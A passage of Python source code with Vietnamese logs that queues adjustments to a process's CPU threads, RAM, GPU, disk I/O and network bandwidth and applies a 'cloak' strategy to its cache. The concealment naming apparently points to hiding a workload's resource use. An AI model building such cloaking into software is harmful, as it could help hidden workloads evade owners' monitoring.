            gpu_config = (self.config.get("resource_allocation", {})
                                  .get("gpu", {})
                                  .get("max_usage_percent", []))

            gpu_usage_percent = []
            if isinstance(gpu_config, list):
                length_needed = len(gpu_config)
                gpu_usage_percent = list(action[2:2 + length_needed])
                next_idx = 2 + length_needed
            elif isinstance(gpu_config, (int, float)):
                gpu_usage_percent = [float(action[2])]
                next_idx = 3
            else:
                self.logger.warning("max_usage_percent không phải list/int/float => bỏ qua GPU")
                next_idx = 2

            disk_io_limit_mbps = float(action[next_idx])
            net_bw_limit_mbps = float(action[next_idx + 1])
            cache_limit_percent = float(action[next_idx + 2])

            # Tạo tasks
            # 1) CPU threads
            t1 = {
                'function': 'adjust_cpu_threads',
                'args': (process.pid, cpu_threads, process.name)
            }
            self.resource_adjustment_queue.put((3, t1))

            # 2) RAM
            t2 = {
                'function': 'adjust_ram_allocation',
                'args': (process.pid, ram_alloc, process.name)
            }
            self.resource_adjustment_queue.put((3, t2))

            # 3) GPU usage
            if gpu_usage_percent:
                t3 = {
                    'function': 'adjust_gpu_usage',
                    'args': (process, gpu_usage_percent)
                }
                self.resource_adjustment_queue.put((3, t3))
            else:
                self.logger.warning(
                    f"Chưa có GPU usage => bỏ qua GPU cho PID={process.pid}"
                )

            # 4) Disk I/O
            t4 = {
                'function': 'adjust_disk_io_limit',
                'args': (process, disk_io_limit_mbps)
            }
            self.resource_adjustment_queue.put((3, t4))

            # 5) Network
            t5 = {
                'function': 'adjust_network_bandwidth',
                'args': (process, net_bw_limit_mbps)
            }
            self.resource_adjustment_queue.put((3, t5))

            # 6) Cloak cache
            self.shared_resource_manager.apply_cloak_strategy('cache', process)

            self.logger.info(
                f"Đã áp dụng các điều chỉnh tài nguyên từ OpenAI cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi apply_recommended_action cho {process.name} (PID={process.pid}): {e}"
            )

    def shutdown_power_management(self):
        try:
            shutdown_power_management()
            self.logger.info("Đã tắt power_management.")
        except Exception as e:
            self.logger.error(f"Lỗi shutdown_power_management: {e}")
